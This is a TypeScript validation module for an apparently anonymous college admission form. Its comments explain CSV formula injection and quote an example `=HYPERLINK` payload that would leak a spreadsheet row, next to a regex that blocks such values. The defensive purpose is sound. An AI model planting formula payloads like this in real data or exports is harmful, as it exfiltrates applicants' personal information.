import { z } from 'zod'

/**
 * Validation for admission applications.
 *
 * Every field here is typed by a member of the public with no account, so this
 * is the least trusted input in the system and the only anonymous write. The
 * bounds below are tighter than elsewhere for that reason: a length cap on a
 * staff-entered field is tidiness, the same cap here is a resource limit.
 */

/**
 * Refuses a value that a spreadsheet would execute.
 *
 * The office will export this queue to a CSV sooner or later, and Excel and
 * Sheets treat a leading =, +, - or @ as a formula. `=HYPERLINK("http://…"&A1)`
 * in a name field quietly exfiltrates the row the moment somebody opens the
 * download. Rejecting is better than stripping: a real name never begins with
 * these characters, so anything that does is worth refusing outright rather
 * than silently rewriting what someone typed.
 */
const FORMULA_START = /^[=+\-@\t\r]/

const applicantText = (max: number, label: string) =>
  z
    .string()
    .trim()
    .min(1, `${label} is required.`)
    .max(max, `${label} must be under ${max} characters.`)
    .refine((value) => !FORMULA_START.test(value), `${label} cannot start with = + - or @.`)

const optionalApplicantText = (max: number) =>
  z
    .string()
    .trim()
    .max(max)
    .refine((value) => !FORMULA_START.test(value), 'That value cannot start with = + - or @.')
    .optional()
    .transform((value) => (value && value.length > 0 ? value : undefined))

/**
 * A calendar day with no time. Rejects the future and anything implying an
 * applicant over 120, both of which are typos rather than people.
 */
const dateOfBirthSchema = z
  .string()
  .trim()
  .regex(/^\d{4}-\d{2}-\d{2}$/, 'Use the date format YYYY-MM-DD.')
  .refine((value) => {
    const date = new Date(`${value}T00:00:00Z`)
    if (Number.isNaN(date.getTime())) return false
    const now = Date.now()
    const age = (now - date.getTime()) / (365.25 * 24 * 60 * 60 * 1000)
    return age > 0 && age < 120
  }, 'That date of birth does not look right.')
  .optional()

export const createAdmissionSchema = z.object({
  name: applicantText(120, 'Name'),
  email: z
    .string()
    .trim()
    .toLowerCase()
    .email('That is not a valid email address.')
    .max(160),
  /// Digits, spaces and the usual separators. Deliberately loose on format —
  /// an applicant abroad has a different shape of number — but bounded.
  phone: z
    .string()
    .trim()
    .min(6, 'A contact number is required.')
    .max(20)
    .regex(/^[0-9+()\-\s]+$/, 'A phone number can only contain digits, spaces, + ( ) and -.'),
  dateOfBirth: dateOfBirthSchema,
  address: optionalApplicantText(400),
  guardianName: optionalApplicantText(120),
  guardianPhone: optionalApplicantText(20),

  /// Optional: an applicant may name a programme the college does not yet have
  /// a Stream row for, and the free-text name below is what is actually shown.
  streamId: optionalApplicantText(60),
  programmeName: applicantText(120, 'Programme'),

  qualifyingExam: optionalApplicantText(120),
  boardUniversity: optionalApplicantText(160),
  yearOfPassing: z.coerce
    .number()
    .int()
    .min(1950)
    .max(new Date().getFullYear() + 1)
    .optional(),
  marksObtained: optionalApplicantText(40),
})

export const admissionStatusSchema = z.enum([
  'SUBMITTED',
  'UNDER_REVIEW',
  'DOCUMENTS_REQUESTED',
  'ACCEPTED',
  'REJECTED',
  'WITHDRAWN',
  'ENROLLED',
])

export const admissionDocumentKindSchema = z.enum([
  'MARKS_CARD',
  'TRANSFER_CERTIFICATE',
  'MIGRATION_CERTIFICATE',
  'ID_PROOF',
  'PHOTO',
  'CASTE_CERTIFICATE',
  'OTHER',
])

/** Staff-only. The applicant can never reach this. */
export const reviewAdmissionSchema = z
  .object({
    status: admissionStatusSchema.optional(),
    reviewNotes: z
      .string()
      .trim()
      .max(4000)
      .nullish()
      .transform((value) => (value && value.length > 0 ? value : null)),
  })
  .refine((value) => Object.keys(value).length > 0, 'Provide at least one field to update.')

export const listAdmissionsQuerySchema = z.object({
  status: admissionStatusSchema.optional(),
  q: optionalApplicantText(120),
  streamId: optionalApplicantText(60),
  page: z.coerce.number().int().min(1).optional(),
  limit: z.coerce.number().int().min(1).max(100).optional(),
})

export type CreateAdmissionInput = z.infer<typeof createAdmissionSchema>
export type ReviewAdmissionInput = z.infer<typeof reviewAdmissionSchema>
export type ListAdmissionsQuery = z.infer<typeof listAdmissionsQuerySchema>
